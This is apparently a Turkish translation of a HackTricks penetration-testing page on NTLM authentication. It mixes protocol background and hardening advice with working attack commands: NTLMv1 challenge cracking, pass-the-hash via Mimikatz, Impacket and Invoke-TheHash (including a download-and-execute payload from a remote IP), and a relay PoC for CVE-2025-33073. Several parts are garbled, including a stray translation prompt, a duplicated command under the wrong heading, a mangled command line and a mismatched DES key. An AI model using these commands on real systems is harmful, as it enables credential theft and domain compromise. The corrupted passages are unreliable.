# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

**Windows XP ve Server 2003** kullanılan ortamlarda LM (Lan Manager) hash'leri kullanılır; ancak bunların kolayca ele geçirilebildiği yaygın olarak bilinir. Belirli bir LM hash'i olan `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığını gösterir ve boş bir dizenin hash'ini temsil eder.

Varsayılan olarak, öncelikli yöntem **Kerberos** kimlik doğrulama protokolüdür. NTLM (NT LAN Manager) belirli durumlarda devreye girer: Active Directory'nin bulunmaması, etki alanının mevcut olmaması, yanlış yapılandırma nedeniyle Kerberos'un çalışmaması veya geçerli bir hostname yerine IP adresi kullanılarak bağlantı kurulmaya çalışılması.

Ağ paketlerinde **"NTLMSSP"** başlığının bulunması, NTLM kimlik doğrulama sürecini gösterir.

LM, NTLMv1 ve NTLMv2 kimlik doğrulama protokolleri için destek, `%windir%\Windows\System32\msv1\_0.dll` konumunda bulunan belirli bir DLL tarafından sağlanır.

**Önemli Noktalar**:

- LM hash'leri savunmasızdır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) bu hash'in kullanılmadığını gösterir.
- Varsayılan kimlik doğrulama yöntemi Kerberos'tur; NTLM yalnızca belirli koşullarda kullanılır.
- NTLM kimlik doğrulama paketleri "NTLMSSP" başlığından tanınabilir.
- LM, NTLMv1 ve NTLMv2 protokolleri `msv1\_0.dll` sistem dosyası tarafından desteklenir.

## LM, NTLMv1 ve NTLMv2

Hangi protokolün kullanılacağını kontrol edebilir ve yapılandırabilirsiniz:

### GUI

_secpol.msc_ dosyasını çalıştırın -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 0'dan 5'e kadar 6 düzey vardır.

![LM, NTLMv1 ve NTLMv2 - GUI: secpol.msc dosyasını çalıştırın - Local policies - Security Options - Network Security: LAN Manager authentication level. 0'dan 5'e kadar 6 düzey vardır](<../../images/image (919).png>)

### Registry

Bu, düzeyi 5 olarak ayarlar:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Olası değerler:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Temel NTLM Domain kimlik doğrulama şeması

1. **Kullanıcı** **kimlik bilgilerini** girer
2. İstemci makine, **domain adını** ve **kullanıcı adını** göndererek bir **kimlik doğrulama isteği gönderir**
3. **Sunucu** **challenge** gönderir
4. **İstemci**, **challenge** değerini anahtar olarak parolanın hash'ini kullanarak **şifreler** ve yanıt olarak gönderir
5. **Sunucu**, **domain adını, kullanıcı adını, challenge değerini ve yanıtı** **Domain controller**'a gönderir. Active Directory yapılandırılmamışsa veya domain adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
6. **Domain controller her şeyin doğru olup olmadığını kontrol eder** ve bilgileri sunucuya gönderir

**Sunucu** ve **Domain Controller**, Domain Controller sunucunun parolasını bildiğinden (**NTDS.DIT** db içindedir), Netlogon sunucusu aracılığıyla bir **Secure Channel** oluşturabilir.

### Yerel NTLM kimlik doğrulama şeması

Kimlik doğrulama, **sunucunun** **SAM** dosyasında kimlik doğrulamaya çalışan kullanıcının hash'ini bilmesi dışında, **önce** bahsedilenle aynıdır. Bu nedenle **sunucu**, Domain Controller'a sormak yerine kullanıcının kimlik doğrulaması yapıp yapamayacağını **kendisi kontrol eder**.

### NTLMv1 Challenge

**Challenge uzunluğu 8 bayttır** ve **yanıtın uzunluğu 24 bayttır**.

**NT hash'i (16 bayt)**, her biri 7 bayt olan **3 parçaya** ayrılır (7B + 7B + (2B+0x00\*5)): **son parça sıfırlarla doldurulur**. Ardından **challenge**, her parçayla ayrı ayrı **şifrelenir** ve **şifrelenmiş sonuç baytları** birleştirilir. Toplam: 8B + 8B + 8B = 24Bytes.

**Sorunlar**:

- **Rastgelelik** eksikliği
- NT hash'ini bulmak için 3 parça **ayrı ayrı saldırıya uğratılabilir**
- **DES kırılabilir**
- 3. anahtar her zaman **5 sıfırdan** oluşur.
- **Aynı challenge** verildiğinde **yanıt** da **aynı** olur. Bu nedenle kurbana challenge olarak "**1122334455667788**" dizesini verebilir ve kullanılan yanıtı **önceden hesaplanmış rainbow table'ları kullanarak** saldırıya uğratabilirsiniz.

### NTLMv1 saldırısı

Unconstrained delegation modern ortamlarda daha az yaygındır, ancak erişilebilir bir **Print Spooler service** yine de böyle bir host'a kimlik doğrulamayı zorlamak için kötüye kullanılabilir.

AD üzerinde zaten sahip olduğunuz bazı kimlik bilgilerini/oturumları kötüye kullanarak **yazıcıdan kontrolünüz altındaki bir host'a karşı kimlik doğrulaması yapmasını** isteyebilirsiniz. Ardından `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama challenge değerini 1122334455667788 olarak ayarlayabilir**, kimlik doğrulama girişimini yakalayabilir ve NTLMv1 kullanılarak gerçekleştirilmişse **parolayı kırabilirsiniz**.\
`responder` kullanıyorsanız kimlik doğrulamayı **downgrade etmeyi** denemek için **`--lm` flag'ini** kullanabilirsiniz.\
_Bu teknik için kimlik doğrulamanın NTLMv1 kullanılarak yapılması gerektiğini unutmayın (NTLMv2 uygun değildir)._

Yazıcının kimlik doğrulama sırasında bilgisayar hesabını kullanacağını ve bilgisayar hesaplarının **uzun ve rastgele parolalar** kullandığını, bu parolaları yaygın **sözlükleri** kullanarak **muhtemelen kıramayacağınızı** unutmayın. Ancak **NTLMv1** kimlik doğrulaması **DES kullanır** ([daha fazla bilgi için buraya bakın](#ntlmv1-challenge)); bu nedenle DES kırmaya özel bazı servisleri kullanarak parolayı kırabilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).

### Hashcat ile NTLMv1 saldırısı

NTLMv1, yakalanan NTLMv1 mesajlarını Hashcat'e uygun biçimlere dönüştüren [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) ile de saldırıya uğratılabilir.<sup>[[1]](#references)</sup>

Komut

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

aşağıdaki çıktıyı üretirdi:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Lütfen çevrilecek içeriği paylaşın.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcat'i çalıştırın (aksi hâlde birkaç gün süreceğinden, hashtopolis gibi bir araçla dağıtık çalıştırmak en iyisidir).

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Bu durumda bunun parolasının password olduğunu biliyoruz, bu yüzden demo amacıyla hile yapacağız:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Şimdi crack edilmiş DES anahtarlarını NTLM hash'inin parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Son olarak, son bölüm:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Bunları birleştirin:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**Challenge uzunluğu 8 byte'tır** ve **2 yanıt gönderilir**: Biri **24 byte** uzunluğundadır, **diğerinin** uzunluğu ise **değişkendir**.

**İlk yanıt**, **istemci ve etki alanından** oluşan **dizinin** **NT hash'in** **MD4 hash'i** kullanılarak **HMAC_MD5** ile şifrelenmesiyle oluşturulur. Ardından **sonuç**, **challenge'ı** HMAC_MD5 ile şifrelemek için **anahtar** olarak kullanılır. Buna **8 byte'lık bir client challenge** eklenir. Toplam: 24 B.

**İkinci yanıt**, **birkaç değer** kullanılarak oluşturulur (yeni bir client challenge, **replay attacks**'i önlemek için bir **timestamp**...)

**Başarılı bir kimlik doğrulama alışverişini içeren bir PCAP'iniz varsa**, domain, username, server challenge ve NTLMv2 yanıtını çıkarın, yakalamayı Hashcat için biçimlendirin ve parola kurtarmayı denemek için `5600` modunu kullanın. Arşivlenmiş uygulamalı kılavuz, paket alanlarını çıkarma prosedürünü içerirken Hashcat'in örnekleri güncel kabul edilen biçimi tanımlar.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Kurbanın hash'ine sahip olduğunuzda**, bunu **onu taklit etmek** için kullanabilirsiniz.\
Bu **hash'i kullanarak NTLM kimlik doğrulaması gerçekleştirecek** bir **araç** kullanmanız gerekir; **ya da** yeni bir **sessionlogon** oluşturup bu **hash'i** LSASS içine **enjekte edebilirsiniz**. Böylece herhangi bir **NTLM kimlik doğrulaması gerçekleştirildiğinde**, **bu hash kullanılır.** Son seçeneği mimikatz kullanır.

**Pass-the-Hash attacks'i Computer accounts kullanarak da gerçekleştirebileceğinizi unutmayın.**

### **Mimikatz**

**Yönetici olarak çalıştırılmalıdır**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Bu, geçerli yerel kullanıcı altında bir process başlatırken LSASS'in sağlanan kimlik bilgilerini giden ağ oturum açma işlemiyle ilişkilendirmesini sağlar. Ardından düz metin parolayı bilmeden, `runas /netonly`'de olduğu gibi sağlanan kullanıcı olarak ağ kaynaklarına erişebilirsiniz.

### Linux'tan Pass-the-Hash

Linux'tan Pass-the-Hash kullanarak Windows makinelerinde code execution elde edebilirsiniz.\
[**Impacket PsExec ile pratik Pass-the-Hash code execution örneklerine bakın.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Impacket'ın Windows için derlenmiş araçları

Windows için [impacket binary'lerini buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Bu durumda bir komut belirtmeniz gerekir; etkileşimli bir shell elde etmek için cmd.exe ve powershell.exe geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Başka birçok Impacket binary'si vardır...

### Invoke-TheHash

PowerShell script'lerini buradan edinebilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Bu işlev önceki modları birleştirir. **Birden fazla host** belirtebilir, seçili hedefleri hariç tutabilir ve _SMBExec, WMIExec, SMBClient_ veya _SMBEnum_ seçeneklerinden birini seçebilirsiniz. _**Command**_ parametresi olmadan **SMBExec** veya **WMIExec** seçerseniz, yalnızca yeterli izniniz olup olmadığını kontrol eder.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Yönetici olarak çalıştırılmalıdır**

Bu tool, mimikatz ile aynı işlemi yapar (LSASS belleğini değiştirir).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Kullanıcı adı ve parola ile manuel Windows uzaktan yürütme


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host'tan kimlik bilgilerini çıkarma

Daha fazla bilgi için [**Windows Kimlik Bilgilerini Çalma**](../stealing-credentials/README.md) sayfasına bakın.

## Internal Monologue attack

Internal Monologue Attack, saldırganın **LSASS süreciyle doğrudan etkileşime girmeden** kurbanın makinesinden NTLM hash'lerini almasını sağlayan gizli bir kimlik bilgisi çıkarma tekniğidir. Hash'leri doğrudan bellekten okuyan ve uç nokta güvenlik çözümleri veya Credential Guard tarafından sıklıkla engellenen Mimikatz'tan farklı olarak bu saldırı, **Security Support Provider Interface (SSPI) üzerinden NTLM kimlik doğrulama paketine (MSV1_0) yapılan yerel çağrılardan** yararlanır. Saldırgan önce NetNTLMv1'e izin verildiğinden emin olmak için NTLM ayarlarını (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) **düşürür**. Ardından çalışan süreçlerden elde edilen mevcut kullanıcı token'larını taklit eder ve bilinen bir challenge kullanarak NetNTLMv1 yanıtları oluşturmak için yerel olarak NTLM kimlik doğrulamasını tetikler.<sup>[[4]](#references)</sup>

Bu NetNTLMv1 yanıtları ele geçirildikten sonra saldırgan, **önceden hesaplanmış rainbow table'lar** kullanarak orijinal NTLM hash'lerini hızla elde edebilir ve yanal hareket için Pass-the-Hash saldırıları düzenleyebilir. Önemli olarak, Internal Monologue Attack gizli kalır; çünkü ağ trafiği oluşturmaz, kod enjekte etmez veya doğrudan bellek dökümleri almaz. Bu da Mimikatz gibi geleneksel yöntemlere kıyasla savunmacıların saldırıyı tespit etmesini zorlaştırır.

Zorunlu güvenlik politikaları nedeniyle NetNTLMv1 kabul edilmiyorsa saldırgan NetNTLMv1 yanıtını alamayabilir.

Bu durumu ele almak için Internal Monologue aracı güncellendi: NetNTLMv1 başarısız olursa bile **NetNTLMv2 yanıtlarını ele geçirmek** için `AcceptSecurityContext()` kullanarak dinamik olarak bir sunucu token'ı edinir. NetNTLMv2'nin kırılması çok daha zor olsa da sınırlı durumlarda relay saldırılarına veya çevrimdışı kaba kuvvet saldırılarına kapı açabilir.

PoC'ye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** adresinden ulaşabilirsiniz.<sup>[[4]](#references)</sup>

## NTLM Relay ve Responder

**Bu saldırıların nasıl gerçekleştirileceğine ilişkin daha ayrıntılı kılavuzu burada okuyun:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Ağ yakalamasından NTLM challenge'larını ayrıştırma

[**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **kullanabilirsiniz**

## Serileştirilmiş SPN'ler üzerinden NTLM ve Kerberos *Reflection* (CVE-2025-33073)

Windows, bir host'tan kaynaklanan NTLM (veya Kerberos) kimlik doğrulamasının SYSTEM ayrıcalıkları elde etmek için **aynı** host'a geri relay edildiği *reflection* saldırılarını önlemeye çalışan çeşitli azaltımlara sahiptir.  

Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki yamalarla kamuya açık zincirlerin çoğunu bozdu. Ancak **CVE-2025-33073**, *marshalled* (serileştirilmiş) hedef bilgileri içeren Service Principal Name'leri (SPN'ler) **SMB client'ın nasıl kestiğini** kötüye kullanarak bu korumaların hâlâ aşılabildiğini gösteriyor.<sup>[[5]](#references)[[6]](#references)</sup>

### Hatanın özeti
1. Saldırgan, etiketi marshalled bir SPN kodlayan bir **DNS A kaydı** oluşturur – ör.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Kurban, bu hostname'e kimlik doğrulaması yapmaya zorlanır (PetitPotam, DFSCoerce vb.).
3. SMB client, hedef dizesi `cifs/srv11UWhRCAAAAA…` değerini `lsasrv!LsapCheckMarshalledTargetInfo` işlevine ilettiğinde, `CredUnmarshalTargetInfo` çağrısı serileştirilmiş blob'u **kaldırır** ve geriye **`cifs/srv1`** kalır.
4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos'taki karşılığı), kısa host kısmı bilgisayar adıyla (`SRV1`) eşleştiği için hedefi *localhost* olarak değerlendirir.
5. Sonuç olarak sunucu `NTLMSSP_NEGOTIATE_LOCAL_CALL` değerini ayarlar ve **LSASS'in SYSTEM access-token'ını** bağlama enjekte eder (Kerberos için SYSTEM işaretli bir alt oturum anahtarı oluşturulur).
6. Bu kimlik doğrulamasını `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host'ta tam SYSTEM yetkileri sağlar.<sup>[[5]](#references)</sup>

### Hızlı PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Yamalar ve Azaltma Yöntemleri
* **CVE-2025-33073** için KB yaması, `mrxsmb.sys::SmbCeCreateSrvCall` içinde `CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER` olduğunda, hedefi marshalled info içeren tüm SMB bağlantılarını engelleyen bir kontrol ekler.<sup>[[5]](#references)[[6]](#references)</sup>
* SMB relay hedeflerinde **SMB signing** zorunlu kılın. Diğer hedeflerde, ilgili protokolün kendi signing veya Extended Protection gereksinimlerini ve yama düzeyini değerlendirin; tek başına SMB signing, HTTPS WinRM relay işleminin mümkün olup olmadığını belirlemez.
* `*<base64>...*` biçimine benzeyen DNS kayıtlarını izleyin ve coercion vektörlerini (PetitPotam, DFSCoerce, AuthIP...) engelleyin.

### Tespit fikirleri
* İstemci IP'si ≠ sunucu IP'si olan `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren ağ yakalamaları.
* Bir subsession key içeren ve istemci principal'ı hostname'e eşit olan Kerberos AP-REQ.
* Windows Event 4624/4648 SYSTEM oturum açma olaylarının hemen ardından aynı host'tan gelen uzak SMB yazma işlemleri.<sup>[[5]](#references)</sup>

Serileştirilmiş bir target-information DNS adı, zorlanmış kimlik doğrulamasını AD CS web-enrollment endpoint'ine yönelik **cross-protocol relay** için bir saldırgana da yönlendirebilir. Bu, aynı host'a yönelik reflection'dan ayrı bir sonuçtur: [ESC8 kayıt koşulları](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS yazma hakları, bir coercion yolu ve hedefin yama düzeyi birbirinden bağımsız olarak değerlendirilmelidir.

**SMB arbitrary ports** ve **TCP connection reuse** yöntemlerini kullanarak `NT AUTHORITY\SYSTEM` erişimi sağlayan **March 2026** local reflection varyantı için bkz.:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Çok Amaçlı Araç](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat örnek hash'leri – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash yardımcı araçları](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS'e Dokunmadan NTLM Hash'lerini Alma](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection öldü, yaşasın NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 Hash'ini Kırma – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
